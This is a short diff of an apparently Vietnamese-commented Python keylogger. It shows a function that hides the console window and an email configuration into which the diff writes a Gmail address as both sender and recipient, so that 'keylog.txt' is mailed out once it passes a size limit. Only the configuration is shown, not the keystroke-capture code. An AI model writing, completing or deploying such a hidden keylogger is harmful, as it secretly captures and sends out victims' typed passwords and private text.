@@ -14,9 +14,9 @@ def hide_console():
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 # Cấu hình email
-EMAIL_ADDRESS = ""  # Địa chỉ email của bạn
-EMAIL_PASSWORD = ""    # Mật khẩu ứng dụng của bạn
-EMAIL_RECIPIENT = ""  # Địa chỉ email nhận log
+EMAIL_ADDRESS = "tiensad2712@gmail.com"  # Địa chỉ email của em 
+EMAIL_PASSWORD = ""    # Mật khẩu ứng dụng của bạn gọi là passapp
+EMAIL_RECIPIENT = "tiensad2712@gmail.com"  # giống dòng trên
 LOG_FILE = "keylog.txt"
 MAX_LOG_SIZE = 100  # Kích thước tối đa của file log trước khi gửi email (10 bytes)
 
